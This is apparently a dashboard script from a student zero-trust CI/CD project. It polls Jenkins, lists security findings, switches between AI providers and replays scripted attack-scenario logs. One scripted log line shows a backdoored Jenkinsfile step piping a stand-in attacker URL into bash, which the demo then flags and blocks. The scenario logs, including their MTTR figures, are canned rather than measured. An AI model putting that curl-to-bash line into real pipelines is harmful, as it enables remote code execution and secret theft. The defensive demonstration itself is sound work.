/* ═══ ZeroTrust CI/CD — ENSA PFS 2026 — dashboard.js ═══ */

const REFRESH_INTERVAL = 8000;
const LOG_MAX_LINES    = 400;

let allFindings       = [];
let currentFilter     = 'all';
let fallbackActive    = false;
let timerInterval     = null;
let jenkinsAvailable  = false;
let lastLogText       = "";
let lastBuildNumber   = null;
let lastBuildFinished = false;
let syncInProgress    = false;
let currentView       = 'dashboard';

// ── Init ──────────────────────────────────────────────────────────────────────
document.addEventListener('DOMContentLoaded', () => {
  appendLog('–', 'SYS', 'i', '=== AI-Powered Zero Trust DevSecOps — Dashboard initialisé ===', 'bright');
  appendLog('–', 'SYS', 'i', 'Connexion à Jenkins en cours…', 'blue');
  appendCursor();
  refreshAll();
  fetchHistory();
  refreshProviderStatus();                          // vérif réelle au démarrage
  setInterval(refreshAll, REFRESH_INTERVAL);
  setInterval(refreshProviderStatus, 15000);        // recheck providers toutes les 15s
});

// ── Refresh principal ─────────────────────────────────────────────────────────
async function refreshAll() {
  document.getElementById('lastRefresh').textContent =
    'MàJ: ' + new Date().toLocaleTimeString('fr-FR');
  await Promise.all([fetchJenkinsStatus(), fetchSecurityMetrics(), fetchFindings(), fetchConsoleLogs()]);
}

// ── Jenkins Status ────────────────────────────────────────────────────────────
async function fetchJenkinsStatus() {
  try {
    const r = await fetch('/api/jenkins/status');
    const d = await r.json();
    if (!d.jenkins_available) { setJenkinsUnavailable(d.error); return; }

    if (lastBuildNumber !== null && d.build_number !== lastBuildNumber) {
      lastLogText = ''; lastBuildFinished = false;
      document.getElementById('consoleBody').innerHTML = '';
      const fb = document.getElementById('consoleBodyFull');
      if (fb) fb.innerHTML = '';
      appendLog('–', 'SYS', 's', `✓ Nouveau build détecté : #${d.build_number}`, 'green');
      resetMetrics();
    }
    if (d.build_finished && !lastBuildFinished && d.build_number === lastBuildNumber) {
      appendLog('–', 'SYS', 'i', `Build #${d.build_number} terminé — sync rapports…`, 'blue');
      autoSyncReports(d.build_number);
      setTimeout(fetchHistory, 2000);
    }
    if (lastBuildNumber === null && d.build_finished) autoSyncReports(d.build_number);

    lastBuildNumber   = d.build_number;
    lastBuildFinished = d.build_finished;
    jenkinsAvailable  = true;

    document.getElementById('buildNum').textContent    = `Build #${d.build_number}`;
    document.getElementById('buildTitle').textContent  = 'SentinelOps';
    document.getElementById('buildBranch').textContent = d.branch || '–';
    document.getElementById('commitHash').textContent  = d.commit || '–';
    if (d.timestamp) document.getElementById('buildTime').textContent =
      new Date(d.timestamp).toLocaleTimeString('fr-FR');

    applyBuildStatus(d.build_status);
    startTimerFrom(d.elapsed_sec ?? 0, d.build_status === 'running');
    setTimerStatus(d.build_status);

    if (d.stages && d.stages.length > 0) renderPipelineFlow(d.stages, d.done_count, d.stages_count);

    const s = document.getElementById('stagesBadge');
    if (s) s.textContent = `${d.done_count}/${d.stages_count}`;
    setBuildBanner(d.build_status === 'running', d.build_number);

    const lv = document.getElementById('liveStatus');
    lv.className = 'chip ok';
    lv.innerHTML = '<span class="dot ok"></span>Jenkins connecté';
  } catch(e) { setJenkinsUnavailable('Erreur réseau'); }
}

async function autoSyncReports(buildNumber) {
  if (syncInProgress) return;
  syncInProgress = true;
  try {
    const r = await fetch('/api/sync-reports');
    const d = await r.json();
    if (d.synced && d.synced.length > 0) {
      appendLog('–', 'SYS', 's', `✓ ${d.synced.length} rapport(s) synchronisé(s) : ${d.synced.join(', ')}`, 'green');
      await Promise.all([fetchSecurityMetrics(), fetchFindings()]);
    } else appendLog('–', 'SYS', 'i', `Sync build #${buildNumber} — aucun rapport disponible`, 'blue');
    if (d.errors && d.errors.length > 0)
      appendLog('–', 'SYS', 'i', `Rapports non disponibles : ${d.errors.join(', ')}`, 'amber');
  } catch(e) {
    appendLog('–', 'SYS', 'e', '✗ Erreur de synchronisation', 'red');
  } finally { syncInProgress = false; appendCursor(); }
}

function setJenkinsUnavailable(msg) {
  jenkinsAvailable = false;
  const lv = document.getElementById('liveStatus');
  lv.className = 'chip amber';
  lv.innerHTML = '<span class="dot warn"></span>Jenkins hors ligne';
  document.getElementById('buildStatus').className = 'chip amber';
  document.getElementById('buildStatus').innerHTML = '<span class="dot warn"></span>Non connecté';
}

function applyBuildStatus(status) {
  const el = document.getElementById('buildStatus');
  const map = {
    running:  {cls:'chip blue',  html:'En cours…'},
    success:  {cls:'chip ok',    html:'<span class="dot ok"></span>Succès ✓'},
    failure:  {cls:'chip red',   html:'Échec ✗'},
    aborted:  {cls:'chip amber', html:'Annulé'},
    unstable: {cls:'chip amber', html:'Instable'},
  };
  const s = map[status] || map.running;
  el.className = s.cls; el.innerHTML = s.html;
}

function setBuildBanner(running, buildNum) {
  const b = document.getElementById('buildBanner');
  const n = document.getElementById('bannerBuildNum');
  if (!b) return;
  b.style.display = running ? 'flex' : 'none';
  if (n) n.textContent = '#' + buildNum;
}

// ── Pipeline flow ─────────────────────────────────────────────────────────────
const STAGE_ICONS = {
  'préparation':'ti-settings','preparation':'ti-settings','setup':'ti-settings',
  'sast':'ti-code','semgrep':'ti-code','sca':'ti-package','trivy':'ti-package',
  'anti-tamper':'ti-shield-lock','anti tamper':'ti-shield-lock','tampering':'ti-shield-lock',
  'remédia':'ti-robot','remediation':'ti-robot','agents':'ti-robot',
  'rapport ia':'ti-file-analytics','explicatif':'ti-file-analytics',
  'docker':'ti-box','build':'ti-box','scan image':'ti-shield','image scan':'ti-shield',
  'dast':'ti-antenna','zap':'ti-antenna','cosign':'ti-certificate','signature':'ti-certificate',
  'rapport pdf':'ti-file-type-pdf','pdf':'ti-file-type-pdf',
  'ai security':'ti-brain','security':'ti-shield-check','guard':'ti-shield-check',
  'deploy':'ti-rocket','production':'ti-rocket','déploiement':'ti-rocket',
};
function iconForStage(name) {
  const key = (name||'').toLowerCase();
  for(const[k,v] of Object.entries(STAGE_ICONS)) if(key.includes(k)) return v;
  return 'ti-circle-dot';
}
function truncateStageName(name) {
  if (!name || !name.trim()) return 'Étape ?';
  const cleaned = name.trim().replace(/^\d+[a-z]?\.\s*/i,'').trim();
  const d = cleaned || name.trim();
  return d.length > 13 ? d.slice(0,12)+'…' : d;
}
function renderPipelineFlow(stages, doneCount, total) {
  const track = document.getElementById('flowTrack');
  track.innerHTML = '';
  stages.forEach((s,i) => {
    const icon = iconForStage(s.name);
    const displayName = truncateStageName(s.name);
    const el = document.createElement('div');
    el.className = `stage ${s.status}`;
    el.title = `${s.name} [${s.status}] — ${s.duration}`;
    el.onclick = () => stageClicked(s);
    el.innerHTML = `
      <div class="stage-node">
        ${s.status==='running'?'<div class="pulse-ring"></div><div class="scan"></div>':''}
        <i class="ti ${icon} stage-icon"></i>
        <div class="stage-name">${escHtml(displayName)}</div>
      </div>
      <div class="stage-dur">${s.duration}</div>`;
    track.appendChild(el);
    if (i < stages.length-1) {
      const c = document.createElement('div'); c.className='connector';
      const lc = s.status==='done'?'done':s.status==='running'?'running':'waiting';
      c.innerHTML=`<div class="conn-line ${lc}"></div>`;
      track.appendChild(c);
    }
  });
  const pct = total>0 ? Math.round(doneCount/total*100) : 0;
  document.getElementById('progressFill').style.width = pct+'%';
}

// ── Timer ─────────────────────────────────────────────────────────────────────
function startTimerFrom(elapsedSec, running) {
  clearInterval(timerInterval);
  // Rejeter les valeurs aberrantes (timestamps ms, négatifs, > 2h)
  const safe = (typeof elapsedSec === 'number' && elapsedSec >= 0 && elapsedSec < 7200)
    ? Math.floor(elapsedSec) : 0;
  const base = Date.now() - safe * 1000;
  const el   = document.getElementById('timer');
  const fmt  = s => String(Math.floor(s/60)).padStart(2,'0') + ':' + String(s%60).padStart(2,'0');
  // Couleur selon état
  el.className = 'timer-val ' + (running ? 'running' : '');
  const tick = () => {
    const s = Math.floor((Date.now() - base) / 1000);
    el.textContent = fmt(s);
  };
  tick();
  // Compter seulement si le pipeline est en cours — sinon figer
  if (running) timerInterval = setInterval(tick, 1000);
}

function setTimerStatus(status) {
  const el = document.getElementById('timer');
  if (!el) return;
  el.className = 'timer-val ' + (status === 'running' ? 'running' : status === 'failure' ? 'failed' : 'done');
}

// ── Metrics ───────────────────────────────────────────────────────────────────
async function fetchSecurityMetrics() {
  try {
    const r = await fetch('/api/status'); const d = await r.json();
    document.getElementById('m-cve').textContent     = d.cve_total     ?? '–';
    document.getElementById('m-cve-sub').textContent = `${d.cve_critical??'–'} critical · ${d.cve_high??'–'} high`;
    document.getElementById('m-sast').textContent    = d.sast_findings ?? '–';
    document.getElementById('m-zap').textContent     = d.zap_alerts    ?? '–';
    document.getElementById('m-zap-sub').textContent = `${d.zap_high??'–'} high severity`;
    if (!fallbackActive) {
      const prov = (d.ai_provider||'claude').toUpperCase();
      document.getElementById('m-ai').textContent          = prov;
      document.getElementById('m-ai-provider').textContent = prov;
      document.getElementById('aiCalls').textContent       = d.ai_calls ?? '–';
      document.getElementById('fallbackCount').textContent = d.fallback_count ?? 0;
    }
    const sub = document.getElementById('m-ai-sub');
    if (sub) sub.textContent = `${d.ai_calls??'–'} calls · ${d.fallback_count??0} fallbacks`;
  } catch(e) {}
}

// ── Findings ──────────────────────────────────────────────────────────────────
async function fetchFindings() {
  try {
    const r = await fetch('/api/findings'); allFindings = await r.json();
  } catch(e) { allFindings = []; }
  const b = document.getElementById('findingsBadge');
  const t = document.getElementById('tabAll');
  if(b) b.textContent = allFindings.length||'0';
  if(t) t.textContent = `(${allFindings.length})`;
  updateTabCounts(allFindings);
  renderFindings(currentFilter);
}
function updateTabCounts(findings) {
  const c = {critical:0,high:0,SAST:0,SCA:0,DAST:0};
  findings.forEach(f=>{
    if(f.severity==='critical') c.critical++;
    if(f.severity==='high') c.high++;
    if(f.source==='SAST') c.SAST++;
    if(f.source==='SCA') c.SCA++;
    if(f.source==='DAST') c.DAST++;
  });
  const s=(id,n)=>{const e=document.getElementById(id);if(e)e.textContent=`(${n})`;};
  s('tabCrit',c.critical); s('tabHigh',c.high);
  s('tabSAST',c.SAST); s('tabSCA',c.SCA); s('tabDAST',c.DAST);
}
function filterFindings(filter, tabEl) {
  currentFilter = filter;
  if(tabEl){
    document.querySelectorAll('.tab').forEach(t=>t.classList.remove('active'));
    tabEl.classList.add('active');
  }
  renderFindings(filter);
}
function renderFindings(filter) {
  const list = document.getElementById('findingsList');
  let data = allFindings;
  if(filter==='critical') data=data.filter(f=>f.severity==='critical');
  else if(filter==='high') data=data.filter(f=>f.severity==='high');
  else if(['SAST','SCA','DAST'].includes(filter)) data=data.filter(f=>f.source===filter);
  if(!data.length){
    const msg = allFindings.length===0
      ? (jenkinsAvailable ? 'Aucun rapport — attente de la fin du build' : 'Jenkins hors ligne')
      : 'Aucun finding pour ce filtre ✓';
    list.innerHTML=`<div class="empty-state"><i class="ti ti-shield-check"></i><br>${msg}</div>`;
    return;
  }
  const iconMap = {critical:'ti-alert-triangle',high:'ti-alert-circle',medium:'ti-info-circle',info:'ti-check'};
  list.innerHTML = '';
  data.forEach(f=>{
    const sev = f.severity||'info';
    const el = document.createElement('div'); el.className='finding';
    el.innerHTML=`
      <div class="finding-icon ${sev}"><i class="ti ${iconMap[sev]||'ti-circle'}"></i></div>
      <div style="flex:1;min-width:0">
        <div class="finding-title">${escHtml(f.title)}</div>
        <div class="finding-meta">${escHtml(f.file||'')}</div>
        ${f.detail?`<div class="finding-detail">${escHtml(f.detail.slice(0,130))}${f.detail.length>130?'…':''}</div>`:''}
        <span class="finding-badge ${sev}">${f.source} · ${sev}</span>
      </div>`;
    list.appendChild(el);
  });
}

// ── Console ───────────────────────────────────────────────────────────────────
async function fetchConsoleLogs() {
  try {
    const r = await fetch('/api/jenkins/logs'); const d = await r.json();
    if(!d.available||!d.text||d.text===lastLogText) return;
    lastLogText = d.text;
    const body = document.getElementById('consoleBody');
    const bodyFull = document.getElementById('consoleBodyFull');
    body.innerHTML = '';
    if(bodyFull) bodyFull.innerHTML = '';
    d.text.split('\n').slice(-LOG_MAX_LINES).forEach(raw=>{
      if(!raw.trim()) return;
      const p = parseJenkinsLine(raw);
      [body, bodyFull].forEach(b=>{
        if(!b) return;
        const el = document.createElement('div'); el.className='log-line';
        el.innerHTML=`<span class="log-ts">${p.ts}</span><span class="log-stage ${p.cls}">${p.stage}</span><span class="log-text ${p.color||''}">${escHtml(p.text)}</span>`;
        b.appendChild(el);
      });
    });
    body.scrollTop=body.scrollHeight;
    if(bodyFull) bodyFull.scrollTop=bodyFull.scrollHeight;
    appendCursor();
  } catch(e) {}
}
function parseJenkinsLine(raw) {
  let ts='–',stage='SYS',cls='i',text=raw,color='';
  const tsM=raw.match(/\[(\d{2}:\d{2}:\d{2})\]/);
  if(tsM){ts=tsM[1];text=raw.slice(raw.indexOf(tsM[0])+tsM[0].length).trim();}
  const low=text.toLowerCase();
  if(low.includes('[sast]')||low.includes('semgrep'))                           {stage='SAST';cls='i';}
  else if(low.includes('[sca]')||low.includes('trivy'))                         {stage='SCA';cls='i';}
  else if(low.includes('[dast]')||low.includes('zap'))                          {stage='DAST';cls='i';}
  else if(low.includes('[ai]')||low.includes('claude')||low.includes('ollama')) {stage='AI';cls='p';}
  else if(low.includes('[audit]'))                                               {stage='AUDIT';cls='i';}
  else if(low.includes('error')||low.includes('failed'))                        {stage='ERR';cls='e';}
  else if(low.includes('stage('))                                                {stage='STGE';cls='s';}
  if(low.includes('error')||low.includes('failed')||low.includes('✗'))         color='red';
  else if(low.includes('warn')||low.includes('cve'))                            color='amber';
  else if(low.includes('success')||low.includes('✓')||low.includes('done'))    color='green';
  else if(low.includes('claude')||low.includes('ollama')||low.includes('fallback')) color='purple';
  else if(low.includes('===')||low.startsWith('+ '))                            color='bright';
  return{ts,stage,cls,text,color};
}
function appendLog(ts, stage, cls, text, color) {
  [document.getElementById('consoleBody'), document.getElementById('consoleBodyFull')].forEach(body=>{
    if(!body) return;
    body.querySelector('.log-cursor-line')?.remove();
    const el=document.createElement('div'); el.className='log-line';
    el.innerHTML=`<span class="log-ts">${ts}</span><span class="log-stage ${cls}">${stage}</span><span class="log-text ${color||''}">${escHtml(text)}</span>`;
    body.appendChild(el);
    while(body.children.length>LOG_MAX_LINES) body.removeChild(body.firstChild);
    body.scrollTop=body.scrollHeight;
  });
}
function appendCursor() {
  [document.getElementById('consoleBody'), document.getElementById('consoleBodyFull')].forEach(body=>{
    if(!body) return;
    body.querySelector('.log-cursor-line')?.remove();
    const el=document.createElement('div'); el.className='log-line log-cursor-line';
    el.innerHTML=`<span class="log-ts">–</span><span class="log-stage i">–</span><span class="log-text"><span class="log-cursor"></span></span>`;
    body.appendChild(el); body.scrollTop=body.scrollHeight;
  });
}
function appendLogToTarget(targetId, ts, stage, cls, text, color) {
  const body = document.getElementById(targetId);
  if(!body) return;
  const el=document.createElement('div'); el.className='log-line';
  el.innerHTML=`<span class="log-ts">${ts}</span><span class="log-stage ${cls}">${stage}</span><span class="log-text ${color||''}">${escHtml(text)}</span>`;
  body.appendChild(el); body.scrollTop=body.scrollHeight;
}
function clearConsole() {
  [document.getElementById('consoleBody'),document.getElementById('consoleBodyFull')].forEach(b=>{if(b)b.innerHTML='';});
  lastLogText='';
  appendLog('–','SYS','i','Console vidée','blue'); appendCursor();
}
function scrollConsole() {
  [document.getElementById('consoleBody'),document.getElementById('consoleBodyFull')].forEach(b=>{if(b)b.scrollTop=99999;});
}
function copyLogs() {
  const lines=[...document.querySelectorAll('#consoleBody .log-line')].map(l=>l.textContent.trim()).join('\n');
  navigator.clipboard.writeText(lines).catch(()=>{});
  appendLog('–','SYS','s','✓ Logs copiés','green');
}

// ── Reset metrics ─────────────────────────────────────────────────────────────
function resetMetrics() {
  ['m-cve','m-sast','m-zap','m-ai'].forEach(id=>{const e=document.getElementById(id);if(e)e.textContent='–';});
  ['m-cve-sub','m-sast-sub','m-zap-sub'].forEach(id=>{const e=document.getElementById(id);if(e)e.textContent='– · –';});
  document.getElementById('m-ai-sub')      && (document.getElementById('m-ai-sub').textContent='– calls · 0 fallbacks');
  document.getElementById('aiCalls')       && (document.getElementById('aiCalls').textContent='–');
  document.getElementById('fallbackCount') && (document.getElementById('fallbackCount').textContent='0');
  allFindings=[]; renderFindings('all');
  appendLog('–','SYS','i','↺ Métriques réinitialisées — nouveau build','blue');
}

// ── History ───────────────────────────────────────────────────────────────────
async function fetchHistory() {
  try { const r=await fetch('/api/history'); renderHistory(await r.json()); } catch(e){}
}
function renderHistory(builds) {
  const c=document.getElementById('historyList'); if(!c) return;
  if(!builds||builds.length===0){c.innerHTML='<div class="history-empty"><i class="ti ti-history"></i><br>Aucun build archivé</div>';return;}
  c.innerHTML='';
  builds.forEach(b=>{
    const sc={SUCCESS:'done',FAILURE:'fail',UNSTABLE:'warn',ABORTED:'warn'}[b.build_result]||'wait';
    const si={done:'ti-circle-check',fail:'ti-circle-x',warn:'ti-alert-circle',wait:'ti-clock'}[sc];
    const scol={done:'green',fail:'red',warn:'amber',wait:''}[sc];
    const date=b.timestamp?new Date(b.timestamp).toLocaleString('fr-FR',{day:'2-digit',month:'2-digit',hour:'2-digit',minute:'2-digit'}):'–';
    const dur=b.duration_ms>0?`${Math.floor(b.duration_ms/60000)}m${String(Math.floor((b.duration_ms%60000)/1000)).padStart(2,'0')}s`:'–';
    const el=document.createElement('div'); el.className='history-item';
    el.innerHTML=`
      <div class="history-header">
        <div class="history-build"><i class="ti ${si} ${scol}"></i><span>#${b.build_number}</span><span class="mono" style="color:var(--text-muted)">${escHtml(b.branch||'–')}</span></div>
        <span class="history-dur">${dur}</span>
      </div>
      <div class="history-date">${date} · ${escHtml(b.commit||'–')}</div>
      <div class="history-stats">
        <span class="hstat red"><i class="ti ti-bug"></i>${b.cve_total}</span>
        <span class="hstat amber"><i class="ti ti-code"></i>${b.sast_findings}</span>
        <span class="hstat blue"><i class="ti ti-antenna"></i>${b.zap_alerts}</span>
        <span class="hstat purple"><i class="ti ti-brain"></i>${(b.ai_provider||'–').toUpperCase()}</span>
      </div>`;
    el.onclick=()=>expandHistoryBuild(b,el);
    c.appendChild(el);
  });
}
function expandHistoryBuild(b, el) {
  const ex=el.querySelector('.history-detail'); if(ex){ex.remove();return;}
  document.querySelectorAll('.history-detail').forEach(d=>d.remove());
  const d=document.createElement('div'); d.className='history-detail';
  d.innerHTML=`
    <div class="hdetail-row"><span>CVEs</span><span>${b.cve_total} total · ${b.cve_critical} crit · ${b.cve_high} high</span></div>
    <div class="hdetail-row"><span>SAST</span><span>${b.sast_findings} findings</span></div>
    <div class="hdetail-row"><span>ZAP</span><span>${b.zap_alerts} alerts · ${b.zap_high} high</span></div>
    <div class="hdetail-row"><span>AI</span><span>${(b.ai_provider||'–').toUpperCase()} · ${b.ai_calls} calls · ${b.fallback_count} fallbacks</span></div>
    <div class="hdetail-downloads">
      <a href="/api/history/${b.build_number}/reports/trivy-report.json" target="_blank" class="hdl-btn"><i class="ti ti-package"></i> Trivy</a>
      <a href="/api/history/${b.build_number}/reports/semgrep-results.json" target="_blank" class="hdl-btn"><i class="ti ti-code"></i> Semgrep</a>
      <a href="/api/history/${b.build_number}/reports/rapport-zerotrust.pdf" target="_blank" class="hdl-btn"><i class="ti ti-file-type-pdf"></i> PDF</a>
    </div>`;
  el.appendChild(d);
}

// ── Trigger pipeline ──────────────────────────────────────────────────────────
async function triggerPipeline(btn) {
  if(btn){btn.disabled=true;btn.textContent='Lancement…';}
  try {
    const r=await fetch('/api/jenkins/trigger',{method:'POST'}); const d=await r.json();
    if(d.success){appendLog('–','SYS','s',`✓ ${d.message}`,'green');lastBuildFinished=false;resetMetrics();setTimeout(refreshAll,3000);}
    else appendLog('–','SYS','e',`✗ ${d.error}`,'red');
  } catch(e){ appendLog('–','SYS','e','✗ Impossible de contacter le serveur','red'); }
  finally { if(btn){btn.disabled=false;btn.innerHTML='<i class="ti ti-player-play"></i> Lancer';} appendCursor(); }
}

// ── Simulate Fallback — appel API réel ────────────────────────────────────────
function applyProviderState(data) {
  // data = réponse de /api/provider/status ou /api/provider/simulate
  const claudeChip = document.getElementById('claudeChip');
  const ollamaChip = document.getElementById('ollamaChip');
  const mAi        = document.getElementById('m-ai');
  const mProv      = document.getElementById('m-ai-provider');
  const fc         = document.getElementById('fallbackCount');
  const dot        = document.getElementById('fallbackDot');

  const claudeUp = data.claude?.up ?? (data.claude_up ?? true);
  const ollamaUp = data.ollama?.up ?? (data.ollama_up ?? false);
  const active   = (data.active_provider || 'ollama').toUpperCase();

  if (claudeChip) {
    if (!claudeUp) {
      claudeChip.className = 'provider-status offline';
      claudeChip.textContent = 'Offline';
    } else if (active === 'CLAUDE') {
      claudeChip.className = 'provider-status ok';
      claudeChip.textContent = 'Actif';
    } else {
      claudeChip.className = 'provider-status standby';
      claudeChip.textContent = 'Standby';
    }
  }

  if (ollamaChip) {
    if (!ollamaUp) {
      ollamaChip.className = 'provider-status offline';
      ollamaChip.textContent = 'Offline';
    } else if (active === 'OLLAMA') {
      ollamaChip.className = 'provider-status ollama-active';
      ollamaChip.textContent = 'Actif';
    } else {
      ollamaChip.className = 'provider-status standby';
      ollamaChip.textContent = 'Standby';
    }
  }

  if (mAi)   mAi.textContent   = active;
  if (mProv) mProv.textContent = active;

  const isFallback = (active === 'OLLAMA') && !claudeUp;
  fallbackActive = isFallback;
  if (dot) dot.classList.toggle('active', isFallback);
  if (fc && isFallback) fc.textContent = String(parseInt(fc.textContent || '0') + 1);
}

async function refreshProviderStatus() {
  try {
    const r = await fetch('/api/provider/status');
    const d = await r.json();
    applyProviderState(d);
  } catch(e) {
    console.warn('[Provider] status check failed', e);
  }
}

// Appelée par le bouton "Simulate Fallback" — cible Ollama offline par défaut
// (ton setup réel : Ollama primaire, Claude standby)
async function simulateFallback(target) {
  // Si pas de target fourni : toggle entre "ollama" offline et reset
  if (!target) target = fallbackActive ? 'reset' : 'ollama';

  const btn = document.querySelector('[onclick*="simulateFallback"]');
  if (btn) { btn.disabled = true; btn.style.opacity = '0.6'; }

  try {
    const r = await fetch('/api/provider/simulate', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ target })
    });
    const d = await r.json();

    applyProviderState(d);

    if (!d.success) {
      appendLog('–', 'AI', 'e', `✗ Erreur simulation : ${d.error}`, 'red');
      return;
    }

    if (d.simulated_offline === 'ollama') {
      appendLog('–', 'AI', 'e', '✗ Ollama mis offline (simulation) — bascule sur Claude API', 'red');
      setTimeout(()=>appendLog('–','AI','i',`⚡ FALLBACK → Claude ${d.claude_up ? 'actif' : 'aussi indisponible'}`, d.claude_up ? 'amber' : 'red'), 300);
      setTimeout(()=>appendLog('–','AI','i',`[AUDIT] provider=${d.active_provider} | simulation=true`, 'blue'), 600);
    } else if (d.simulated_offline === 'claude') {
      appendLog('–', 'AI', 'e', '✗ Claude API mis offline (simulation) — bascule sur Ollama', 'red');
      setTimeout(()=>appendLog('–','AI','i',`⚡ FALLBACK → Ollama ${d.ollama_up ? 'actif (local, <35s)' : 'aussi indisponible'}`, d.ollama_up ? 'amber' : 'red'), 300);
      setTimeout(()=>appendLog('–','AI','i',`[AUDIT] provider=${d.active_provider} | fallback=ACTIVATED | data=LOCAL`, 'blue'), 600);
    } else {
      appendLog('–', 'AI', 's', '✓ Simulation annulée — providers restaurés', 'green');
      setTimeout(()=>appendLog('–','AI','i',`[AUDIT] provider=${d.active_provider} | simulation=false`, 'blue'), 300);
    }
  } catch(e) {
    appendLog('–', 'AI', 'e', `✗ Erreur réseau : ${e.message}`, 'red');
  } finally {
    if (btn) { btn.disabled = false; btn.style.opacity = '1'; }
    appendCursor();
  }
}

// Compatibilité interne (scénario 4 appelle simulateFallback directement)
function _legacySimulateFallback() {
  fallbackActive = !fallbackActive;
  const claude=document.getElementById('claudeChip'), ollama=document.getElementById('ollamaChip');
  const mAi=document.getElementById('m-ai'), mProv=document.getElementById('m-ai-provider');
  const fc=document.getElementById('fallbackCount'), dot=document.getElementById('fallbackDot');
  if(fallbackActive){
    if(claude){claude.className='provider-status offline';claude.textContent='Offline';}
    if(ollama){ollama.className='provider-status ollama-active';ollama.textContent='Actif';}
    if(mAi) mAi.textContent='OLLAMA';
    if(mProv) mProv.textContent='OLLAMA';
    if(fc) fc.textContent=String(parseInt(fc.textContent||'0')+1);
    if(dot) dot.classList.add('active');
    appendLog('–','AI','e','✗ Claude API indisponible — timeout réseau simulé','red');
    setTimeout(()=>appendLog('–','AI','i','⚡ FALLBACK → Ollama Mistral 7B (local, <35s)','amber'),300);
    setTimeout(()=>appendLog('–','AI','i','[AUDIT] provider=ollama | données traitées localement','blue'),600);
  } else {
    if(claude){claude.className='provider-status ok';claude.textContent='Actif';}
    if(ollama){ollama.className='provider-status standby';ollama.textContent='Standby';}
    if(mAi) mAi.textContent='CLAUDE';
    if(mProv) mProv.textContent='CLAUDE';
    if(dot) dot.classList.remove('active');
    appendLog('–','AI','s','✓ Claude API restaurée — provider primaire actif','green');
    setTimeout(()=>appendLog('–','AI','i','[AUDIT] provider=claude | fallback désactivé','blue'),300);
  }
  appendCursor();
}

// ══════════════════════════════════════════════════════════════════════════════
// NAVIGATION — Vues
// ══════════════════════════════════════════════════════════════════════════════
function setActiveNav(selector) {
  document.querySelectorAll('.nav-item').forEach(n=>n.classList.remove('active'));
  if(selector) document.querySelector(selector)?.classList.add('active');
}
function hideAllViews() {
  ['view-dashboard','view-console','view-attacks','view-monitoring'].forEach(id=>{
    const el=document.getElementById(id); if(el) el.style.display='none';
  });
}
function showDashboard(evt) {
  hideAllViews();
  document.getElementById('view-dashboard').style.display='';
  currentView='dashboard';
  document.querySelectorAll('.nav-item').forEach(n=>n.classList.remove('active'));
  if(evt?.currentTarget) evt.currentTarget.classList.add('active');
  else document.querySelector('.nav-item')?.classList.add('active');
}
function showConsoleView(evt) {
  hideAllViews();
  const v=document.getElementById('view-console'); v.style.display='flex';
  currentView='console';
  document.querySelectorAll('.nav-item').forEach(n=>n.classList.remove('active'));
  if(evt?.currentTarget) evt.currentTarget.classList.add('active');
  const src=document.getElementById('consoleBody');
  const dst=document.getElementById('consoleBodyFull');
  if(src&&dst){ dst.innerHTML=src.innerHTML; dst.scrollTop=dst.scrollHeight; }
}
function showAttacks(evt) {
  hideAllViews();
  document.getElementById('view-attacks').style.display='';
  currentView='attacks';
  document.querySelectorAll('.nav-item').forEach(n=>n.classList.remove('active'));
  if(evt?.currentTarget) evt.currentTarget.classList.add('active');
}
function showMonitoring(evt) {
  hideAllViews();
  document.getElementById('view-monitoring').style.display='';
  currentView='monitoring';
  document.querySelectorAll('.nav-item').forEach(n=>n.classList.remove('active'));
  if(evt?.currentTarget) evt.currentTarget.classList.add('active');
  if(!monitoringInit){initMonitoringCharts();monitoringInit=true;}
  fetchMonitoringData();
}
function jumpTo(sectionId, evt) {
  showDashboard(evt);
  setTimeout(()=>{
    const el=document.getElementById(sectionId);
    if(el) el.scrollIntoView({behavior:'smooth',block:'start'});
  },100);
}
function jumpToFindings(filter, evt) {
  showDashboard(evt);
  filterFindings(filter);
  document.querySelectorAll('.tab').forEach(t=>{
    if(t.onclick?.toString().includes(`'${filter}'`)) t.click();
  });
  setTimeout(()=>{
    const el=document.getElementById('findingsCard');
    if(el) el.scrollIntoView({behavior:'smooth',block:'start'});
  },150);
}
function stageClicked(s) { appendLog('–','UI','i',`Stage: ${s.name} [${s.status}] — ${s.duration}`,'blue'); }
function downloadFile(f) { window.open(`/reports/${f}`,'_blank'); }

// ══════════════════════════════════════════════════════════════════════════════
// SCÉNARIOS D'ATTAQUE — Routes backend réelles
// ══════════════════════════════════════════════════════════════════════════════

// Correspondance scénario → route Flask
const SCENARIO_ROUTES = {
  1: '/api/attack/cve',
  2: '/api/attack/antitamper',
  3: '/api/attack/sqli',
  4: '/api/attack/fallback'
};

const SCENARIOS = {
  1: {
    title: 'Injection CVE Critique',
    logs: [
      {d:0,   stage:'SYS',  cls:'i', text:'=== Scénario 01 : Injection CVE Critique ===', c:'bright'},
      {d:200, stage:'SCA',  cls:'i', text:'→ Modification de requirements.txt : ajout py==1.11.0', c:''},
      {d:700, stage:'SCA',  cls:'i', text:'→ Trivy FS scan : ./test-app...', c:''},
      {d:1400,stage:'SCA',  cls:'e', text:'✗ CVE-2022-42969 détecté dans py==1.11.0 — CVSS 7.5 HIGH', c:'red'},
      {d:1600,stage:'SCA',  cls:'i', text:'14 CVEs total | 0 CRITICAL | 3 HIGH', c:'amber'},
      {d:2100,stage:'AI',   cls:'p', text:'→ Claude API (claude-sonnet-4-5) — analyse CVE...', c:'purple'},
      {d:3200,stage:'AI',   cls:'s', text:'✓ Patch généré : py==1.11.0 → py>=1.11.0.post0', c:'green'},
      {d:3800,stage:'AI',   cls:'i', text:'[AUDIT] provider=claude | MTTR=3min | fallback=false', c:'blue'},
      {d:4200,stage:'SYS',  cls:'s', text:'✓ Scénario 01 terminé — MTTR mesuré : 3 min (−93%)', c:'green'},
    ]
  },
  2: {
    title: 'Backdoor Jenkinsfile',
    logs: [
      {d:0,   stage:'SYS',  cls:'i', text:'=== Scénario 02 : Backdoor dans le Jenkinsfile ===', c:'bright'},
      {d:300, stage:'PIPE', cls:'e', text:'✗ Étape suspecte détectée dans Jenkinsfile :', c:'red'},
      {d:500, stage:'PIPE', cls:'e', text:'    sh "curl https://attacker.io/exfil | bash"', c:'red'},
      {d:900, stage:'AI',   cls:'p', text:'→ Agent Anti-Tamper (Claude) analyse le Jenkinsfile...', c:'purple'},
      {d:1800,stage:'AI',   cls:'e', text:'✗ ALERTE : exfiltration de secrets via curl détectée', c:'red'},
      {d:2000,stage:'AI',   cls:'e', text:'✗ Pattern malveillant : curl | bash sur URL externe', c:'red'},
      {d:2400,stage:'AI',   cls:'s', text:'✓ Pipeline BLOQUÉ — exit code 1 (Zero Trust enforcement)', c:'green'},
